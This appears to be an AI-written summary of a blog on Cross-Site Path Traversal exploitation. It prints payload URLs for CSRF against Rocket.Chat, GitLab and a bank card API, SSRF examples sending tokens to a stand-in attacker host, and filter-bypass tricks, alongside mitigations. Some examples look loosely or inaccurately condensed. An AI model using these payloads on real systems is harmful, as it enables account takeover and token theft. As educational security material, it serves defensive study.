
### **Cross-Site Path Traversal (CSPT) Exploitation Techniques**

Here’s a **summarized and organized version** of the key tips and techniques for exploiting **Cross-Site Path Traversal (CSPT)** vulnerabilities from the provided blog:

---

#### **1. Introduction to CSPT**
- **Definition**:  
  CSPT occurs when user-controlled input is used to manipulate file paths or resource URLs on the client side, leading to unauthorized access or resource manipulation.  
- **Impact**:  
  - Unauthorized access to sensitive files.  
  - Manipulation of client-side resources.  
  - Potential escalation to **Cross-Site Request Forgery (CSRF)** or **Server-Side Request Forgery (SSRF)**.  

---

#### **2. CSPT to CSRF (CSPT2CSRF)**
- **Concept**:  
  Exploit CSPT to reroute legitimate API requests to malicious endpoints, leading to CSRF attacks.  
- **Example**:  
  - **Source**: User-controlled input (e.g., URL parameters, DOM).  
  - **Sink**: API endpoint that shares the same host, headers, and body restrictions.  
  - **Exploitation**:  
    ```plaintext
    /marketplace/private/install?id=../../../api/v1/users.logoutOtherClients&url=https://google.com
    ```
  - **Impact**: Perform actions like logging out users or enabling 2FA without their consent.  

---

#### **3. Real-World CSPT Exploits**
1. **1-Click CSPT2CSRF in Rocket.Chat**:  
   - **Vulnerability**: Path manipulation in API endpoints.  
   - **Exploit**:  
     ```plaintext
     /marketplace/private/install?id=../../../api/v1/users.logoutOtherClients&url=https://google.com
     ```
   - **Impact**: Log out all user sessions or enable 2FA.  

2. **1-Click Cancel a Bank Card**:  
   - **Vulnerability**: Path traversal in invite links.  
   - **Exploit**:  
     ```plaintext
     /signup/invite?email=foo@bar.com&inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel
     ```
   - **Impact**: Cancel a bank card without user consent.  

3. **CSPT Leading to 1-Click CSRF in GitLab**:  
   - **Vulnerability**: Manipulation of error IDs in Sentry integration.  
   - **Exploit**:  
     ```plaintext
     /api/v4/users/4?admin=true
     ```
   - **Impact**: Escalate user privileges or approve group memberships.  

---

#### **4. CSPT Combined with SSRF**
- **Exploit Scenario**:  
  - **Blind SSRF**: Requires an authorization header.  
  - **CSPT**: Manipulate paths to include SSRF payloads.  
  - **Example**:  
    ```plaintext
    /users?id=/../../example?url=https://attacker-site/?payload
    ```
  - **Impact**: Steal authentication tokens or perform unauthorized actions.  

---

#### **5. CSPT in CSS Injection**
- **Exploit**:  
  - **Vulnerability**: Unsanitized `color_scheme` parameter in CSS URLs.  
  - **Payload**:  
    ```plaintext
    /../../../api/2/idp/authorize/?client_id=CLIENT-ID&redirect_uri=/hci/callback&state=http://localhost/css/core.css
    ```
  - **Impact**: Load malicious CSS to exfiltrate user data.  

---

#### **6. CSPT Burp Extension**
- **Tool**: [CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension).  
- **Features**:  
  - Automates CSPT detection and exploitation.  
  - Identifies sources and sinks for CSPT vulnerabilities.  
- **Limitations**:  
  - May miss DOM-based or stored sources without canary tokens.  
  - Ineffective against client-side routing.  

---

#### **7. Common Exploitation Techniques**
1. **URL Manipulation**:  
   - Use `?`, `#`, or `;` to truncate or add query parameters.  
   - Example:  
     ```plaintext
     /example?url=https://attacker.com?param=value
     ```

2. **HTTP Method Override**:  
   - Use headers like `X-HTTP-Method-Override` to change request methods.  
   - Example:  
     ```plaintext
     X-HTTP-Method-Override: PUT
     ```

3. **URL Encoding**:  
   - Encode or double-encode path parameters to bypass filters.  
   - Example:  
     ```plaintext
     /api/v1/users/%2F..%2F..%2Fadmin
     ```

4. **Lax Backend Validation**:  
   - Exploit backends that accept extra body or query parameters.  
   - Example:  
     ```json
     {"email":"foo@bar.com","admin":"true"}
     ```

---

#### **8. Prevention and Mitigation**
- **Input Validation**:  
  - Sanitize and validate all user-controlled inputs.  
- **Strict Path Handling**:  
  - Restrict path traversal characters (`..`, `/`).  
- **Secure Redirects**:  
  - Validate `redirect_uri` against a whitelist.  
- **Use Secure Frameworks**:  
  - Implement frameworks that prevent path manipulation.  

---

#### **9. Additional Resources**
- [Doyensec CSPT2CSRF Blog](https://www.doyensec.com/resources/Doyensec_CSPT2CSRF_OWASP_Appsec_Lisbon.pdf)  
- [USENIX Security Paper on CSPT](https://www.usenix.org/system/files/sec21-khodayari.pdf)  
- [GitHub CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)  

---


- https://youtu.be/yGRRGUtT9MU?si=OLNg6eaQNplLuWag
